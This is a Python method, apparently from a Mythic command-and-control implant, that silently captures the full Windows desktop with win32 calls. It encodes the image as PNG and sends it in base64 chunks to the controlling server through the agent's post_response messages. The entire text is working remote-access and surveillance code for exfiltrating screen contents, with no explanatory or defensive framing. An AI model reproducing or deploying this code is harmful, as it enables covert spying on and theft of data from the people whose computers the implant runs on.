    def screenshot2(self, task_id):
        if platform.system() != 'Windows':
            return "screenshot2: only supported on Windows"

        try:
            import win32gui, win32ui, win32con, win32api
            from PIL import Image
            import io

            hdesktop = win32gui.GetDesktopWindow()
            width    = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
            height   = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
            left     = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
            top      = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

            desktop_dc = win32gui.GetWindowDC(hdesktop)
            img_dc     = win32ui.CreateDCFromHandle(desktop_dc)
            mem_dc     = img_dc.CreateCompatibleDC()
            bmp        = win32ui.CreateBitmap()
            bmp.CreateCompatibleBitmap(img_dc, width, height)
            mem_dc.SelectObject(bmp)
            mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)

            bmpinfo = bmp.GetInfo()
            bmpstr  = bmp.GetBitmapBits(True)
            mem_dc.DeleteDC()
            win32gui.DeleteObject(bmp.GetHandle())

            im  = Image.frombuffer(
                'RGB',
                (bmpinfo['bmWidth'], bmpinfo['bmHeight']),
                bmpstr, 'raw', 'BGRX', 0, 1
            )
            buf = io.BytesIO()
            im.save(buf, format="PNG")
            sh_data = buf.getvalue()

        except Exception as e:
            with self._taskings_lock:
                task = next((t for t in self.taskings if t["task_id"] == task_id), None)
            if task:
                task["result"]    = "Screenshot capture failed: {}".format(e)
                task["error"]     = True
                task["completed"] = True
            return None

        try:
            file_size    = len(sh_data)
            total_chunks = (file_size + CHUNK_SIZE - 1) // CHUNK_SIZE
            ts           = datetime.now().strftime('%Y%m%d_%H%M%S')

            init_resp = self.postMessageAndRetrieveResponse({
                "action": "post_response",
                "responses": [{
                    "task_id":       task_id,
                    "total_chunks":  total_chunks,
                    "file_path":     "screenshot_{}.png".format(ts),
                    "chunk_size":    CHUNK_SIZE,
                    "is_screenshot": True
                }]
            })

            responses_list = init_resp.get("responses", [])
            file_id = responses_list[0].get("file_id") if responses_list else None

            if not file_id:
                raise ValueError("Mythic nao retornou file_id. Resposta: {}".format(init_resp))

            for i in range(total_chunks):
                with self._taskings_lock:
                    stopped = next(
                        (t["stopped"] for t in self.taskings if t["task_id"] == task_id),
                        False
                    )
                if stopped:
                    break
                chunk_data = sh_data[i * CHUNK_SIZE:(i + 1) * CHUNK_SIZE]
                self.postMessageAndRetrieveResponse({
                    "action": "post_response",
                    "responses": [{
                        "task_id":    task_id,
                        "chunk_num":  i + 1,
                        "file_id":    file_id,
                        "chunk_data": base64.b64encode(chunk_data).decode()
                    }]
                })

            with self._taskings_lock:
                task = next((t for t in self.taskings if t["task_id"] == task_id), None)
            if task:
                task["result"]           = json.dumps({"file_id": file_id})
                task["_screenshot_sent"] = True
                task["completed"]        = True

        except Exception as e:
            with self._taskings_lock:
                task = next((t for t in self.taskings if t["task_id"] == task_id), None)
            if task:
                task["result"]    = "Screenshot send failed: {}".format(e)
                task["error"]     = True
                task["completed"] = True

        return None
